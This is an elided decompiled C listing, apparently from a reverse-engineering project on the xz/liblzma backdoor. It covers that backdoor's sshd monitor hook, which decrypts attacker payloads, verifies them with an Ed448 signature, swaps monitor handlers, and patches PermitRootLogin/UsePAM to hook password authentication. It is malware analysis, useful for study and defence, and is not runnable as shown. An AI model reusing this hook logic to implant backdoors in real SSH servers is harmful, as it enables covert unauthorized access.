// /home/kali/xzre-ghidra/xzregh/108EA0_mm_answer_keyallowed_payload_dispatch_hook.c
// Function: mm_answer_keyallowed_payload_dispatch_hook @ 0x108EA0
// Calling convention: __stdcall
// Prototype: int __stdcall mm_answer_keyallowed_payload_dispatch_hook(ssh * ssh, int sock, sshbuf * m)
...
int mm_answer_keyallowed_payload_dispatch_hook(ssh *ssh,int sock,sshbuf *m)

{
  ...
  state_ok = payload_stream_validate_or_poison(global_ctx);
  ...
  state_ok = sshbuf_extract_ptr_and_len(m,ctx,(void **)&payload_ctx,(size_t *)&orig_handler);
  if ((state_ok == FALSE) ||
     (state_ok = sshbuf_extract_rsa_modulus
  ...
  payload_stream_decrypt_and_append_chunk((key_payload_t *)payload_ctx,payload_chunk_size,ctx);
    ...
    if (payload_record != (sshd_payload_ctx_t *)0x0) {
        ...
        if ((((ctx->sshd_ctx->mm_answer_keyverify_slot != (sshd_monitor_func_t *)0x0) &&
          ...
          *(u8 *)((long)&sshd_ctx->keyverify_reply_len + 1) =
          ...
          if ((sshd_ctx->keyverify_reply_len == 0) ||
            ...
            keyverify_handler = sshd_ctx_cursor->mm_answer_keyverify_send_staged_reply_hook;
            if (keyverify_handler != (sshd_monitor_func_t)0x0) {
              *sshd_ctx_cursor->mm_answer_keyverify_slot = keyverify_handler;
              write_result = fd_write_full(sock,payload_record + 1,payload_data_offset,libc_imports_ref);
              if (-1 < write_result) {
                return 0;
              }
              goto LAB_0010944f;
      ...
      // AutoDoc: Type 1 payloads stash an authpassword body for later—record the length/pointer so the authpassword hook can emit it on demand.
        ...
        *(u8 *)((long)&sshd_ctx->pending_authpayload_len + 1) =
        ...
        state_ok = sshd_patch_permitrootlogin_usepam_and_hook_authpassword
                           (TRUE,FALSE,FALSE,MONITOR_REQ_MODULI,ctx);
LAB_001092e5:
    ...
    if (payload_state == PAYLOAD_STREAM_EXPECT_HEADER) {
      ...
      if (((payload_record != (sshd_payload_ctx_t *)0x0) &&
        ...
        state_ok = secret_data_decrypt_with_embedded_seed(payload_seed_buf,ctx);
        if ((state_ok != FALSE) &&
           (state_ok = verify_ed448_signed_payload
                               (ctx->sshd_sensitive_data->host_pubkeys[ctx->sshd_host_pubkey_idx],
                                ...
                                payload_header_buf,0x3a,0x5a,ctx->payload_ctx->ed448_signature,payload_seed_buf,ctx),
           state_ok != FALSE)) {
          ...
          state_ok = payload_stream_validate_or_poison(ctx);
          goto LAB_001092e5;
        }
      }
...
LAB_00109471:
        ...
        state_ok = verify_ed448_signed_payload
                           (ctx->sshd_sensitive_data->host_pubkeys[ctx->sshd_host_pubkey_idx],
                            ctx->payload_buffer,payload_data_offset + ctx->sock_read_len,ctx->payload_buffer_size
                            ...
                            ,payload_header_buf,ctx->payload_ctx->signed_header_prefix,ctx);
        if (state_ok == FALSE) {
          ctx->payload_state = PAYLOAD_STREAM_POISONED;
          goto LAB_00109471;
        }
